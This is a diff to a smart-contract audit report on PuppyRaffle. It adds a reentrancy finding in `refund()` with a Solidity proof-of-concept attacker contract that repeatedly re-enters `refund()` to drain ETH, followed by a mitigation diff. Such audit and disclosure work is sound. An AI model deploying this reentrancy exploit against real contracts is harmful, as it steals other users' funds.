@@ -1,4 +1,4 @@
-### [S-#] Lopint through players array to check for duplicates in `PuppyRaffle::enterRaffle()` is a potential DoS attack, incrementing gas costs for future entrants
+### [H-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle()` is a potential DoS attack, incrementing gas costs for future entrants
 
 **Description:** The `PuppyRaffle::enterRaffle()` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more gas costs for future entrants. Every additional address in the `players` array is an additional check the loop have to make.
 ```javascript
@@ -92,4 +92,89 @@ function selectWinner() external {
 ```
 
 
+### [H-2] Reentrancy in `PuppyRaffle::refund()`. Attacker can drain all the funds from the contract. 
 
+
+**Description:** The `PuppyRaffle::refund()` function doesn't follow CEI (Checks, Effects, Interactions) pattern. A malicious actor can exploit this by creating a contract with a fallback/receive function that calls `refund()` again when receiving ETH, allowing them to repeatedly withdraw funds before their player status is removed. This can continue until the contract's balance is drained.
+
+```javascript
+
+    function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+
+        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+    
+  @>    payable(msg.sender).sendValue(entranceFee);
+
+        players[playerIndex] = address(0);
+        emit RaffleRefunded(playerAddress);
+    }
+```
+
+**Impact:** An attacker can drain all ETH from the contract, stealing funds from other participants and making the raffle system inoperable.
+
+
+**Proof of Concept:**
+
+<details> 
+<summary>PoC</summary>
+Place the folowing test into `PuppyRaffleTest.t.sol`
+
+```javascript
+
+//SPDX-License-Identifier: MIT;
+
+pragma solidity ^0.7.6;
+
+import {PuppyRaffle} from "../../src/PuppyRaffle.sol";
+
+
+contract ReentrancyAttacker {
+    PuppyRaffle target;
+    uint256 playerIndex;
+
+    constructor(address _target) payable {
+        target = PuppyRaffle(_target);
+    }
+    
+    function attack() public {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        target.enterRaffle{value: target.entranceFee()}(players);
+        playerIndex = target.getActivePlayerIndex(address(this));
+        target.refund(playerIndex);
+    }
+
+    receive() external payable {
+        if (address(target).balance >= 1 ether) {
+            target.refund(playerIndex);
+        }
+    }
+}
+
+```
+</details>
+
+
+**Recommended Mitigation:** Update the `refund()` function to follow the CEI pattern by moving the state changes before the external call:
+
+```diff
+
+    function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+
+        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
++       players[playerIndex] = address(0);
+    
+        payable(msg.sender).sendValue(entranceFee);
+
+-       players[playerIndex] = address(0);
+        emit RaffleRefunded(playerAddress);
+    }
+
+```
+
+In that case we first remove the player from the `players` array, then we send the ETH to the player, it will protect the contract from reentrancy.
